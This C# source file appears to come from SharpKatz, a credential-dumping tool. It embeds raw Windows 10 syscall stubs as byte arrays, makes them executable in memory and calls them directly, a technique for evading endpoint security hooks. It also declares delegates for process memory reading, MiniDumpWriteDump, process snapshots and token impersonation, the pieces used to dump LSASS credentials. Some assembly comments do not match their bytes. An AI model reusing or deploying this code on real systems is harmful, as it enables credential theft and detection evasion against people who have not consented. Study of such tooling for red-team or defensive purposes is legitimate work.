using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using static SharpKatz.Natives;

namespace SharpKatz
{
    class SysCall
    {
        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x0f
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwClose10 = { 0x49, 0x89, 0xCA, 0xB8, 0x0F, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x3A
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwWriteVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3A, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x50
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwProtectVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x36
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bZwQuerySystemInformation10 = { 0x49, 0x89, 0xCA, 0xB8, 0x36, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  4c 8b d1                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x18
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtReadVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x3f, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x3f
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtAllocateVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x1E
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtFreeVirtualMemory10 = { 0x49, 0x89, 0xCA, 0xB8, 0x1E, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        /// 0:  49 89 ca                mov r10,rcx
        /// 3:  b8 0f 00 00 00          mov eax,0x55
        /// 8:  0f 05                   syscall
        /// a:  c3                      ret

        static byte[] bNtCreateFile10 = { 0x49, 0x89, 0xCA, 0xB8, 0x55, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        ///0:  49 89 ca                mov r10,rcx
        ///3:  b8 26 00 00 00          mov eax,0x26
        ///8:  0f 05                   syscall
        ///a:  c3                      ret

        static byte[] bZwOpenProcess10 = { 0x49, 0x89, 0xCA, 0xB8, 0x26, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3 };

        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
            byte[] syscall = bZwOpenProcess10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwOpenProcess myAssemblyFunction = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwOpenProcess));

                    return (NTSTATUS)myAssemblyFunction(out hProcess, processAccess, objAttribute, ref clientid);
                }
            }
        }

        public static NTSTATUS ZwClose10(IntPtr handle)
        {
            byte[] syscall = bZwClose10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwClose myAssemblyFunction = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwClose));

                    return (NTSTATUS)myAssemblyFunction(handle);
                }
            }
        }

        public static NTSTATUS ZwWriteVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
            byte[] syscall = bZwWriteVirtualMemory10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                }
            }
        }

        public static NTSTATUS ZwProtectVirtualMemory10(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten)
        {
            byte[] syscall = bZwProtectVirtualMemory10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwProtectVirtualMemory myAssemblyFunction = (Delegates.ZwProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwProtectVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, ref lpBaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, ref lpNumberOfBytesWritten);
                }
            }
        }

        public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)
        {
            byte[] syscall = bZwQuerySystemInformation10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.ZwQuerySystemInformation myAssemblyFunction = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwQuerySystemInformation));

                    return (NTSTATUS)myAssemblyFunction(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);
                }
            }
        }

        public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
        {
            byte[] syscall = bNtReadVirtualMemory10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtReadVirtualMemory myAssemblyFunction = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtReadVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction( ProcessHandle, BaseAddress, Buffer,  NumberOfBytesToRead, NumberOfBytesRead);
                }
            }
        }

        public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
        {
            byte[] syscall = bNtAllocateVirtualMemory10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtAllocateVirtualMemory myAssemblyFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
                }
            }
        }

        public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)
        {
            byte[] syscall = bNtFreeVirtualMemory10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtFreeVirtualMemory myAssemblyFunction = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtFreeVirtualMemory));

                    return (NTSTATUS)myAssemblyFunction(hProcess, ref BaseAddress, ref RegionSize, FreeType);
                }
            }
        }

        public static NTSTATUS NtCreateFile10(out Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle,
                Int32 desiredAccess,
                ref OBJECT_ATTRIBUTES objectAttributes,
                out IO_STATUS_BLOCK ioStatusBlock,
                ref Int64 allocationSize,
                UInt32 fileAttributes,
                System.IO.FileShare shareAccess,
                UInt32 createDisposition,
                UInt32 createOptions,
                IntPtr eaBuffer,
                UInt32 eaLength)
        {
            byte[] syscall = bNtCreateFile10;

            unsafe
            {
                fixed (byte* ptr = syscall)
                {

                    IntPtr memoryAddress = (IntPtr)ptr;

                    if (!Natives.VirtualProtect(memoryAddress,
                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    Delegates.NtCreateFile myAssemblyFunction = (Delegates.NtCreateFile)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateFile));

                    return (NTSTATUS)myAssemblyFunction(out fileHandle,
                 desiredAccess,
                ref objectAttributes,
                out ioStatusBlock,
                ref allocationSize,
                 fileAttributes,
                 shareAccess,
                 createDisposition,
                 createOptions,
                 eaBuffer,
                 eaLength);
                }
            }
        }

        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwClose(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref uint NumberOfBytesToProtect, uint NewAccessProtection, ref uint lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtCreateFile(out Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle,
                Int32 desiredAccess,
                ref OBJECT_ATTRIBUTES objectAttributes,
                out IO_STATUS_BLOCK ioStatusBlock,
                ref Int64 allocationSize,
                UInt32 fileAttributes,
                System.IO.FileShare shareAccess,
                UInt32 createDisposition,
                UInt32 createOptions,
                IntPtr eaBuffer,
                UInt32 eaLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlEqualUnicodeString(UNICODE_STRING String1, UNICODE_STRING String2, bool CaseInSensitive);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate void RtlGetNtVersionNumbers(out UInt32 major, out UInt32 minor, out UInt32 build);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, Microsoft.Win32.SafeHandles.SafeFileHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);


            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int LdrLoadDll(IntPtr PathToFile,
                UInt32 dwFlags,
                ref Natives.UNICODE_STRING ModuleFileName,
                ref IntPtr ModuleHandle);


            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool RevertToSelf();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate Boolean ImpersonateLoggedOnUser(IntPtr hToken);


            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate IntPtr GetCurrentProcess();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool CloseHandle(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint newprotect, out uint oldprotect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool LookupPrivilegeValue(String lpSystemName, String lpName, ref LUID luid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate int PssCaptureSnapshot(IntPtr ProcessHandle, PSS_CAPTURE_FLAGS CaptureFlags, int ThreadContextFlags, ref IntPtr SnapshotHandle);

            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool MyMiniDumpWriteDumpCallback(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
            public delegate bool ConvertSidToStringSid(byte[] pSID, out string ptrSid);
        }
    }
}
